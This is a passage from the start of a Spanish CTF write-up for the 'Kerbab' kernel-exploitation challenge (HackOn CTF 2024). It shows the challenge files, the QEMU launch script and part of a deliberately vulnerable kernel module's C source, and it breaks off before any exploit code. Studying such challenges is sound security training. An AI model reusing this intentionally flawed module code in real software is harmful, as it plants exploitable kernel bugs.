@@ -1,0 +1,957 @@
+<!doctype html><html lang="es"><head><title>Kerbab | 7Rocky</title>
+<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="HackOn CTF 2024. Explotación de kernel. Explotación del _heap_. _Off-by-one_. Reglas `seccomp`"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="HackOn CTF 2024. Explotación de kernel. Explotación del _heap_. _Off-by-one_. Reglas `seccomp`"><meta itemprop="keywords" content><meta itemprop="name" content="Kerbab"><meta property="article:published_time" content><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="HackOn CTF 2024. Explotación de kernel. Explotación del _heap_. _Off-by-one_. Reglas `seccomp`"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="Kerbab"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/ctf/other/hackon-ctf/kerbab/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="HackOn CTF 2024. Explotación de kernel. Explotación del _heap_. _Off-by-one_. Reglas `seccomp`"><meta name="twitter:description" content="HackOn CTF 2024. Explotación de kernel. Explotación del _heap_. _Off-by-one_. Reglas `seccomp`"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="Kerbab"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/ctf/other/hackon-ctf/kerbab/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HACKON CTF</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/other/hackon-ctf/kerbab/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/other/hackon-ctf/kerbab/&amp;text=Kerbab" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/ctf/other/hackon-ctf/kerbab/&amp;title=Kerbab" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Kerbab</h1><p class="mb4 f6 dib tracked">24 minutos de lectura</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#análisis-del-código-fuente">Análisis del código fuente</a><ul><li><a href="#función-inicial">Función inicial</a></li><li><a href="#función-de-asignación">Función de asignación</a></li><li><a href="#cifrado-rc4">Cifrado RC4</a></li><li><a href="#función-de-lectura">Función de lectura</a></li></ul></li><li><a href="#configuración-del-entorno">Configuración del entorno</a><ul><li><a href="#peculiaridades">Peculiaridades</a></li></ul></li><li><a href="#solución-no-intencionada">Solución no intencionada</a></li><li><a href="#estrategia-de-explotación">Estrategia de explotación</a></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a><ul><li><a href="#primeras-pruebas">Primeras pruebas</a></li><li><a href="#clave-de-rc4">Clave de RC4</a></li><li><a href="#primitiva-de-escritura-arbitraria">Primitiva de escritura arbitraria</a></li><li><a href="#_exploit_-final"><em>Exploit</em> final</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Se nos proporciona un sistema de archivos Linux y otros archivos comunes en retos de explotación de kernel:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">ls</span> -lh
+total 12M
+-rw-r--r-- 1 root root  618 Feb 25 23:21 Dockerfile
+-rwxr-xr-x 1 root root   59 Feb 25 23:21 <span class="code-green">deploy_docker.sh</span>
+-rw-r--r-- 1 root root  155 Feb 25 23:21 docker-compose.yml  
+-rw-r--r-- 1 root root 2.4M Feb 25 23:21 <span class="code-red">initramfs.cpio.gz</span>
+-rw-r--r-- 1 root root 6.2K Feb 25 23:21 kebab.c
+drwxr-xr-x 7 root root 4.0K Feb 25 23:21 <span class="code-blue">pc-bios</span>
+-rwxr-xr-x 1 root root  396 Feb 25 23:21 <span class="code-green">run.sh</span>
+-rw-r--r-- 1 root root 9.6M Feb 25 23:21 vmlinuz-4.19.306
+-rw-r--r-- 1 root root  176 Feb 25 23:21 xinetd
+
+<span class="code-red">#</span> <span class="code-dark-green">cat</span> <span class="mtku">run.sh</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#! /bin/bash</span>
+
+<span class="mtk8">qemu-system-x86_64</span><span class="mtk1"> </span><span class="mtk6">\</span>
+<span class="mtk1">        </span><span class="mtk6">-nographic</span><span class="mtk1"> </span><span class="mtk6">\</span>
+<span class="mtk1">        </span><span class="mtk6">-cpu</span><span class="mtk1"> </span><span class="mtk4">kvm64,+smep,+smap,check</span><span class="mtk1"> </span><span class="mtk6">\</span>
+<span class="mtk1">        </span><span class="mtk6">-kernel</span><span class="mtk1"> </span><span class="mtk4">/home/user/vmlinuz-4.19.306</span><span class="mtk1"> </span><span class="mtk6">\</span>
+<span class="mtk1">        </span><span class="mtk6">-initrd</span><span class="mtk1"> </span><span class="mtk4">/home/user/initramfs.cpio.gz</span><span class="mtk1"> </span><span class="mtk6">\</span>
+<span class="mtk1">        </span><span class="mtk6">-m</span><span class="mtk1"> </span><span class="mtk6">1024</span><span class="mtk4">M</span><span class="mtk1"> </span><span class="mtk6">\</span>
+<span class="mtk1">        </span><span class="mtk6">-L</span><span class="mtk1"> </span><span class="mtk4">/home/user/pc-bios/</span><span class="mtk1"> </span><span class="mtk6">\</span>
+<span class="mtk1">        </span><span class="mtk6">-no-reboot</span><span class="mtk1"> </span><span class="mtk6">\</span>
+<span class="mtk1">        </span><span class="mtk6">-monitor</span><span class="mtk1"> </span><span class="mtk4">none</span><span class="mtk1"> </span><span class="mtk6">\</span>
+<span class="mtk1">        </span><span class="mtk6">-sandbox</span><span class="mtk1"> </span><span class="mtk4">on,obsolete=deny,elevateprivileges=deny,spawn=deny</span><span class="mtk4">,resourcecontrol=deny</span><span class="mtk1"> </span><span class="mtk6">\</span>  
+<span class="mtk1">        </span><span class="mtk6">-append</span><span class="mtk1"> </span><span class="mtk4">"console=ttyS0 oops=panic panic=1 quiet kaslr slub</span><span class="mtk4">_debug=- apparmor=0"</span><span class="mtk1"> </span><span class="mtk6">\</span>
+</code></pre></div><h2 id="análisis-del-código-fuente">Análisis del código fuente</h2><p>En este caso, disponemos del código fuente en C del módulo de kernel vulnerable (llamado <code>safe_guard</code> como <em>device</em>). En primer lugar, define algunas constantes, variables globales y estructuras de datos:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">#define</span><span class="mtk1"> </span><span class="mtk8">DEVICE_NAME</span><span class="mtk1">           </span><span class="mtk4">"safe_guard"</span>
+<span class="mtk5">#define</span><span class="mtk1"> </span><span class="mtk8">KEBAB_MAX_BUFFER_SIZE</span><span class="mtk1"> </span><span class="mtk6">2048</span>
+<span class="mtk5">#define</span><span class="mtk1"> </span><span class="mtk8">KEBAB_IOCTL_NEW</span><span class="mtk1">       </span><span class="mtk5">0x</span><span class="mtk6">FABADA</span>
+<span class="mtk5">#define</span><span class="mtk1"> </span><span class="mtk8">KEBAB_IOCTL_READ</span><span class="mtk1">      </span><span class="mtk5">0x</span><span class="mtk6">BEBE</span>
+<span class="mtk5">#define</span><span class="mtk1"> </span><span class="mtk8">KEBAB_IOCTL_SET_KEY</span><span class="mtk1">   </span><span class="mtk5">0x</span><span class="mtk6">1CAFE</span>
+<span class="mtk5">#define</span><span class="mtk1"> </span><span class="mtk8">KEBAB_MAX_BUFFERS</span><span class="mtk1">     </span><span class="mtk6">4</span>
+<span class="mtk5">#define</span><span class="mtk1"> </span><span class="mtk8">MAX_RC4_LEN</span><span class="mtk1">           </span><span class="mtk6">256</span>
+
+<span class="mtk7 mtki">struct</span><span class="mtk1"> </span><span class="mtk8 mtku">secure_buffer</span><span class="mtk1"> {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk5">*</span> <span class="mtk1">buffer</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> </span><span class="mtk1">size</span><span class="mtk1">;</span>
+<span class="mtk1">};</span>
+
+<span class="mtk7 mtki">struct</span><span class="mtk1"> </span><span class="mtk8 mtku">new_secbuff_arg</span><span class="mtk1"> {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> </span><span class="mtk1">size</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk1">key</span><span class="mtk1">[</span><span class="mtk8">MAX_RC4_LEN</span><span class="mtk1">];</span>
+<span class="mtk1">  </span><span class="mtk5">const</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk5">*</span> <span class="mtk1">buffer</span><span class="mtk1">;</span>
+<span class="mtk1">};</span>
+
+<span class="mtk7 mtki">struct</span><span class="mtk1"> </span><span class="mtk8 mtku">read_secbuff_arg</span><span class="mtk1"> {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk1">index</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk1">key</span><span class="mtk1">[</span><span class="mtk8">MAX_RC4_LEN</span><span class="mtk1">];</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk5">*</span> <span class="mtk1">buffer</span><span class="mtk1">;</span>
+<span class="mtk1">};</span>
+
+<span class="mtk7 mtki">struct</span><span class="mtk1"> </span><span class="mtk8 mtku">key_info</span><span class="mtk1">{</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk1">pid</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">struct</span><span class="mtk1"> </span><span class="mtk8 mtku">task_struct</span><span class="mtk5">*</span> <span class="mtk1">cur</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> </span><span class="mtk1">max_len</span><span class="mtk1">;</span>
+<span class="mtk1">};</span>
+
+<span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">struct</span><span class="mtk1"> </span><span class="mtk8 mtku">secure_buffer</span><span class="mtk5">*</span> <span class="mtk1">sec_buffs</span><span class="mtk1">[</span><span class="mtk8">KEBAB_MAX_BUFFERS</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> {</span><span class="mtk6">0</span><span class="mtk1">};</span>  
+<span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk1">n_buffs</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">struct</span><span class="mtk1"> </span><span class="mtk8 mtku">mutex</span><span class="mtk1"> </span><span class="mtk1">kebab_mutex</span><span class="mtk1">;</span>
+<span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk1">RC4_key</span><span class="mtk1">[</span><span class="mtk8">MAX_RC4_LEN</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> {</span><span class="mtk6">0</span><span class="mtk1">};</span>
+
+<span class="mtk7 mtki">struct</span><span class="mtk1"> </span><span class="mtk8 mtku">rc4_state</span><span class="mtk1"> {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk1">perm</span><span class="mtk1">[</span><span class="mtk6">256</span><span class="mtk1">];</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk1">index1</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk1">index2</span><span class="mtk1">;</span>
+<span class="mtk1">};</span>
+</code></pre></div><p>La interacción con el módulo se realiza mediante <code>ioctl</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk8">kebab_ioctl</span><span class="mtk1">(</span><span class="mtk7 mtki">struct</span><span class="mtk1"> </span><span class="mtk8 mtku">file</span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk9 mtki">file</span><span class="mtk1">, </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">cmd</span><span class="mtk1">, </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk9 mtki">arg</span><span class="mtk1">) {</span>  
+<span class="mtk1">  </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk1">__user</span><span class="mtk5">*</span><span class="mtk1"> argp </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">void</span><span class="mtk1"> __user</span><span class="mtk5">*</span><span class="mtk1">) arg;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk1">err</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk8">mutex_trylock</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">kebab_mutex</span><span class="mtk1">)) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EAGAIN;</span>
+
+<span class="mtk1">  </span><span class="mtk5">switch</span><span class="mtk1"> (</span><span class="mtk9 mtki">cmd</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk8">KEBAB_IOCTL_NEW</span><span class="mtk1">:</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">strlen</span><span class="mtk1">(</span><span class="mtk1">RC4_key</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">      </span><span class="mtk1">err</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EINVAL;</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk1">err</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">ioctl_new</span><span class="mtk1">(argp);</span>
+<span class="mtk1">    </span><span class="mtk5">break</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk8">KEBAB_IOCTL_READ</span><span class="mtk1">:</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">strlen</span><span class="mtk1">(</span><span class="mtk1">RC4_key</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">      </span><span class="mtk1">err</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EINVAL;</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk1">err</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">ioctl_read</span><span class="mtk1">(argp);</span>
+<span class="mtk1">    </span><span class="mtk5">break</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk8">KEBAB_IOCTL_SET_KEY</span><span class="mtk1">:</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">strlen</span><span class="mtk1">(</span><span class="mtk1">RC4_key</span><span class="mtk1">) </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">      </span><span class="mtk1">err</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EINVAL;</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk1">err</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">ioctl_set_key</span><span class="mtk1">(argp);</span>
+<span class="mtk1">    </span><span class="mtk5">break</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk5">default</span><span class="mtk1">:</span>
+<span class="mtk1">    </span><span class="mtk1">err</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EINVAL;</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk8">mutex_unlock</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">kebab_mutex</span><span class="mtk1">);</span>
+
+<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">err</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Aquí tendremos que especificar alguna de las tres opciones posibles. Nótese que se utiliza <code>mutex</code> para bloquear la ejecución de cualquiera de las opciones y se desbloquea al final. Así, el kernel se protege de las condiciones de carrera.</p><h3 id="función-inicial">Función inicial</h3><p>La primera opción que tenemos que usar es <code>KEBAB_IOCTL_SET_KEY</code> (si no, no podremos usar el resto de opciones):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">ioctl_set_key</span><span class="mtk1">(</span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk9 mtki">__user</span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk9 mtki">argp</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">copy_from_user</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">RC4_key</span><span class="mtk1">, argp, </span><span class="mtk8">MAX_RC4_LEN</span><span class="mtk1">)) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EFAULT;</span>  
+
+<span class="mtk1">  </span><span class="mtk7 mtki">struct</span><span class="mtk1"> </span><span class="mtk8 mtku">key_info</span><span class="mtk1"> </span><span class="mtk1">info</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> { current-&gt;pid, current, </span><span class="mtk8">MAX_RC4_LEN</span><span class="mtk1"> };</span>
+
